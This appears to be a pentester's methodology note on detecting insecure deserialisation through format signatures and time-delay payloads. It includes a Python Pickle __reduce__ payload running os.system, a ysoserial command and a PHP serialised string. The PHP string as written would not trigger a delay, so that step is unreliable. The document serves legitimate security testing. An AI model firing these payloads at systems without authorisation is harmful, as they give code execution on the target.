
## Goal

Identify whether the target is deserialising untrusted data and determine the language/framework in use, then route to the appropriate branch.

## 1. Does the application <u>send you</u> serialised data?

Check for unrecognised encoded values in:

- Cookies
- Hidden form fields (view source)
- POST body parameters (Burp)
- API request/responses
- **Yes** → go to 2
- **No** → go to 3

## 2. Decode and identify the signature

```bash
echo "SUSPICIOUS_VALUE" | base64 -d | xxd | head
```

| First bytes (hex)        | Base64 prefix | Format                    |
| ------------------------ | ------------- | ------------------------- |
| `ac ed 00 05`            | `rO0AB`       | Java serialised object    |
| `80 04 95`               | `gASV`        | Python Pickle protocol 4+ |
| `80 02`                  | `gAJ`         | Python Pickle protocol 2  |
| `80 03`                  | `gAN`         | Python Pickle protocol 3  |
| Starts with `O:` or `a:` | n/a           | PHP serialised object     |

- **Matched** → record format → go to 4
- **No match** → inspect further or move on

## 3. Does the application accept input you can submit serialised data to?

Candidate inputs to target:

- File uploads accepting `.pkl` `.pickle` `.ser` `.bin` `.dat`
- POST parameters accepting blobs or encoded values
- `Content-Type: application/octet-stream` endpoints
- **Standard form fields — if the app processes structured data, try submitting serialised payloads directly into standard form inputs / textarea form inputs**

> [!note] Quick fingerprint map: 
> Python/Flask → Pickle 
> PHP → `PHPSESSID`, `.php` URLs  
> Java → `JSESSIONID`, `.jsp` URLs, `X-Powered-By: Servlet`

Submit the matching sleep payload to every candidate input one at a time. Time each response — a ~5 second delay confirms deserialisation.
### Python:

##### **Python Pickle (form field, cookie, POST/GET parameter):**

```python
import pickle, os, base64

class Test(object):
    def __reduce__(self):
        return (os.system, ('sleep 5',))

print(base64.b64encode(pickle.dumps(Test())).decode())
```
Save as `test.py` → run `python3 test.py` → submit base64 output to the candidate input.

##### **Python Pickle (file upload):**

```python
import pickle, os

class Test(object):
    def __reduce__(self):
        return (os.system, ('sleep 5',))

with open('test.pkl', 'wb') as f:
    pickle.dump(Test(), f)
```
Save as `test.py` → run `python3 test.py` → produces `test.pkl` → upload to the candidate file upload input → time the response.

### **PHP:**

```php
O:8:"stdClass":1:{s:3:"cmd";s:7:"sleep 5";}
```

### **Java:**

```bash
# Requires ysoserial
java -jar ysoserial.jar CommonsCollections1 'sleep 5' | base64
```

### Decision Tree:
- **~5 second delay on any input** → deserialisation confirmed → record format and input → go to 4
- **No delay on any input** → deserialisation not identified → return to main test flow

## 4. Route to exploit branch

- Python Pickle → [[Insecure Deserialisation - Python (Pickle)]]
- PHP → [[Insecure Deserialisation - PHP]]
- Java → [[Insecure Deserialisation - Java]]